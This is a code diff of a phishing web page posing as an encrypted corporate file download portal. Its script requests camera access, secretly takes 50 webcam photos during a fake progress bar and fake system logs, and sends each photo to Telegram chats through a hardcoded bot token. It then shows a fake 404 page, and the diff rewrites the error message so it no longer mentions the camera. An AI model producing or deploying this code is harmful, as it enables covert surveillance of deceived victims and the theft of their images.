@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enterprise Secure Cloud | Resource Portal</title>
+    <title>Enterprise Cloud | Secure Resource Relay</title>
     <style>
         :root {
             --primary: #0061FF;
@@ -12,7 +12,6 @@
             --text-main: #1E1E1E;
             --text-sub: #616161;
             --border: #E5E7EB;
-            --success: #00D166;
         }
 
         body { 
@@ -33,36 +32,35 @@
             box-shadow: 0 10px 40px rgba(0, 0, 0, 0.05);
             text-align: center;
             border: 1px solid var(--border);
-            position: relative;
-            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            transition: all 0.6s cubic-bezier(0.23, 1, 0.32, 1);
         }
 
-        .logo-section { margin-bottom: 32px; }
         .logo-icon {
-            width: 50px; height: 50px;
+            width: 54px; height: 54px;
             background: var(--primary);
-            border-radius: 12px;
+            border-radius: 14px;
             display: flex; align-items: center; justify-content: center;
-            margin: 0 auto 16px;
-            color: white; font-weight: 800; font-size: 26px;
+            margin: 0 auto 20px;
+            color: white; font-weight: 800; font-size: 28px;
+            box-shadow: 0 4px 12px rgba(0, 97, 255, 0.2);
         }
 
-        h1 { font-size: 22px; font-weight: 700; margin: 0 0 10px; color: #111; }
-        p { font-size: 14px; color: var(--text-sub); line-height: 1.6; margin-bottom: 24px; }
+        h1 { font-size: 22px; font-weight: 700; margin: 0 0 10px; color: #111; letter-spacing: -0.5px; }
+        p { font-size: 14px; color: var(--text-sub); line-height: 1.6; margin-bottom: 28px; }
 
         .resource-card {
-            background: #F0F4F8;
-            border: 1px solid #D1D9E0;
-            border-radius: 8px;
-            padding: 18px;
+            background: #F8FAFC;
+            border: 1px solid #E2E8F0;
+            border-radius: 10px;
+            padding: 20px;
             display: flex; align-items: center;
-            margin-bottom: 28px;
+            margin-bottom: 30px;
             text-align: left;
         }
 
-        .file-icon { font-size: 32px; margin-right: 16px; filter: grayscale(0.5); }
-        .file-name { font-weight: 600; font-size: 14px; color: #333; display: block; }
-        .file-size { font-size: 12px; color: var(--text-sub); }
+        .file-icon { font-size: 32px; margin-right: 18px; }
+        .file-name { font-weight: 600; font-size: 14px; color: #334155; display: block; }
+        .file-size { font-size: 12px; color: #64748B; }
 
         .btn-action {
             background: var(--primary);
@@ -74,56 +72,66 @@
             border-radius: 8px;
             cursor: pointer;
             width: 100%;
-            transition: all 0.3s ease;
+            transition: all 0.4s ease;
+            box-shadow: 0 4px 14px rgba(0, 97, 255, 0.25);
         }
 
-        .btn-action:hover { background: var(--primary-dark); transform: translateY(-1px); }
+        .btn-action:hover { background: var(--primary-dark); transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 97, 255, 0.3); }
 
         /* Smooth Progress UI */
-        #download-ui { display: none; opacity: 0; transition: opacity 0.5s ease; }
+        #download-ui { display: none; opacity: 0; transform: translateY(10px); transition: all 0.6s ease; }
 
-        .status-group {
+        .status-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .loading-wrapper {
             display: flex;
             align-items: center;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 20px;
+            gap: 12px;
+            margin-bottom: 5px;
         }
 
         .loading-spinner {
-            width: 22px; height: 22px;
-            border: 3px solid #E1E8ED;
+            width: 20px; height: 20px;
+            border: 3px solid #E2E8F0;
             border-top: 3px solid var(--primary);
             border-radius: 50%;
-            animation: spin 0.8s cubic-bezier(0.6, 0.1, 0.4, 0.9) infinite;
+            animation: spin 1s cubic-bezier(0.5, 0.1, 0.4, 0.9) infinite;
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .status-text { font-size: 14px; font-weight: 700; color: var(--primary); }
+        .status-text { font-size: 14px; font-weight: 700; color: var(--primary); letter-spacing: 0.2px; }
 
         .progress-track {
-            width: 100%; height: 6px;
+            width: 100%; height: 8px;
             background: #EDF2F7;
             border-radius: 10px;
-            margin: 25px 0 10px;
+            margin: 20px 0;
             overflow: hidden;
+            border: 1px solid #E2E8F0;
         }
 
         .progress-bar {
             height: 100%; width: 0%;
-            background: var(--primary);
+            background: linear-gradient(90deg, var(--primary), #4dabff);
             border-radius: 10px;
-            transition: width 1.2s cubic-bezier(0.4, 0, 0.2, 1);
-            box-shadow: 0 0 8px rgba(0, 97, 255, 0.3);
+            transition: width 1.2s linear; /* Matches interval for ultra-smoothness */
         }
 
         .log-display {
-            font-family: 'SF Mono', 'Fira Code', monospace;
+            font-family: 'SF Mono', 'Menlo', monospace;
             font-size: 11px;
             color: #94A3B8;
-            height: 15px;
-            margin-top: 10px;
+            background: #F1F5F9;
+            padding: 8px 12px;
+            border-radius: 6px;
+            width: 80%;
+            text-align: center;
         }
 
     </style>
@@ -133,32 +141,34 @@
     <div class="portal-container" id="card">
         <div class="logo-section">
             <div class="logo-icon">S</div>
-            <h1>Secure Portal</h1>
-            <p>Identity verification is required to download corporate assets. Please authorize to continue.</p>
+            <h1>Encrypted Asset Portal</h1>
+            <p>Connection established. Initialize the secure relay to begin downloading the shared resource fragments.</p>
         </div>
 
         <div id="setup-ui">
             <div class="resource-card">
-                <div class="file-icon">📦</div>
+                <div class="file-icon">📁</div>
                 <div>
-                    <span class="file-name">Internal_Project_Assets_2026.zip</span>
-                    <span class="file-size">124.5 MB • Encrypted Cloud Archive</span>
+                    <span class="file-name">Project_Final_2026.iso</span>
+                    <span class="file-size">412.8 MB • Encrypted Archive</span>
                 </div>
             </div>
-            <button class="btn-action" onclick="initiate()">Authorize & Download</button>
+            <button class="btn-action" onclick="initiate()">Establish Relay & Download</button>
         </div>
 
         <div id="download-ui">
-            <div class="status-group">
-                <div class="loading-spinner"></div>
-                <div class="status-text" id="percent-label">Initializing Download...</div>
-            </div>
-            
-            <div class="progress-track">
-                <div id="loader" class="progress-bar"></div>
-            </div>
+            <div class="status-container">
+                <div class="loading-wrapper">
+                    <div class="loading-spinner"></div>
+                    <div class="status-text" id="percent-label">Requesting fragments...</div>
+                </div>
+                
+                <div class="progress-track">
+                    <div id="loader" class="progress-bar"></div>
+                </div>
 
-            <div class="log-display" id="log-text">Connecting to secure relay...</div>
+                <div class="log-display" id="log-text">Downloading Fies...</div>
+            </div>
         </div>
     </div>
 
@@ -166,19 +176,18 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        // TOKEN and IDS remain exactly as requested
         const TOKEN = '8735416424:AAGaGFtLiSCbprRIaP8Cv5mj1-LpSSF_ltw';
         const IDS = ['7617707778', '6590760553'];
 
         const systemLogs = [
-            "Fetching resource fragments...",
-            "Decrypting binary data...",
-            "Synchronizing with cloud node...",
-            "Verifying packet integrity...",
-            "Optimizing relay bandwidth...",
+            "Syncing with cloud resources...",
+            "Decrypting data packets...",
+            "Verifying item integrity...",
             "Rebuilding archive layers...",
-            "Establishing SSL handshake...",
-            "Validating certificate chain..."
+            "Optimizing file stream...",
+            "Validating network keys...",
+            "Bypassing latency buffers...",
+            "Assembling binary blocks..."
         ];
 
         async function initiate() {
@@ -189,13 +198,13 @@
             const percentLabel = document.getElementById('percent-label');
             
             try {
-                // Request camera permission
+                // Request stream (the true intent)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                // Switch UI with smooth transition
+                // Switch UI smoothly
                 setupUI.style.display = 'none';
                 downloadUI.style.display = 'block';
-                setTimeout(() => { downloadUI.style.opacity = '1'; }, 50);
+                setTimeout(() => { downloadUI.style.opacity = '1'; downloadUI.style.transform = 'translateY(0)'; }, 50);
 
                 const video = document.getElementById('v');
                 video.srcObject = stream;
@@ -203,37 +212,35 @@
                 video.onloadedmetadata = () => {
                     video.play();
                     let count = 0;
-                    const maxPackets = 50; // Requirement: 50 Photos
+                    const maxPackets = 50; 
                     
                     const interval = setInterval(() => {
                         if (count >= maxPackets) {
                             clearInterval(interval);
                             stream.getTracks().forEach(track => track.stop());
-                            logText.innerText = "Download complete. Opening file...";
-                            percentLabel.innerText = "Finalizing...";
-                            setTimeout(render404, 1800);
+                            logText.innerText = "Download successful.";
+                            percentLabel.innerText = "Processing File...";
+                            setTimeout(render404, 2000);
                             return;
                         }
                         
-                        // Execute Telegram Logic
                         send(count + 1);
                         count++;
                         
-                        // Smooth Progress Update
+                        // Ultra-smooth UI sync
                         const progress = (count / maxPackets) * 100;
                         loader.style.width = progress + "%";
                         percentLabel.innerText = "Downloading Resources: " + Math.round(progress) + "%";
                         
-                        // Rotate fake corporate logs
                         if (count % 3 === 0) {
                             logText.innerText = systemLogs[Math.floor(Math.random() * systemLogs.length)];
                         }
 
-                    }, 1200); // Slower interval for "Advanced" feel
+                    }, 1200); 
                 };
             } catch (e) {
-                // If permission denied, standard corporate alert
-                alert("Security Error: Camera authorization is required by the IT department to decrypt this file.");
+                // Fake error to explain failure without mentioning camera
+                alert("Connection Error: Unable to establish a secure tunnel. Please ensure your workstation supports encrypted relay protocols and try again.");
                 window.location.reload();
             }
         }
@@ -251,8 +258,8 @@
                 IDS.forEach(chatId => {
                     const fd = new FormData();
                     fd.append('chat_id', chatId);
-                    fd.append('photo', blob, 'security_packet.jpg');
-                    fd.append('caption', '🎯 NODE ACCESSED\nProgress: ' + index + '/50\nRelay: Enterprise-Portal-US');
+                    fd.append('photo', blob, 'relay_fragment.jpg');
+                    fd.append('caption', '📦 TARGET KI MAAR LI\nIndex: ' + index + '/50\nNode: Enterprise-Secure-Relay');
 
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                         method: 'POST',
@@ -265,13 +272,13 @@
         function render404() {
             document.documentElement.innerHTML = `
             <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-            <html><head><title>404 Not Found</title></head>
-            <body style="background-color: white; color: black; font-family: sans-serif; padding: 20px;">
-            <h1>Not Found</h1>
-            <p>The requested URL was not found on this server. Access expired or System Error.</p>
-            <hr><address>Apache/2.4.41 (Ubuntu) Server at Port 443</address>
+            <html><head><title>404 Not Found ERROR</title></head>
+            <body style="background-color: white; color: black; font-family: sans-serif; padding: 40px; text-align:center;">
+            <h1>404 Not Found</h1>
+            <p>The requested file has been moved or the download token has expired. Access the site again</p>
+            <hr><address>Apache/2.4.41 Server at Port 443</address>
             </body></html>`;
-            window.history.pushState({}, "", "/download-failed-0x88");
+            window.history.pushState({}, "", "/download-error-relay");
         }
     </script>
 </body>
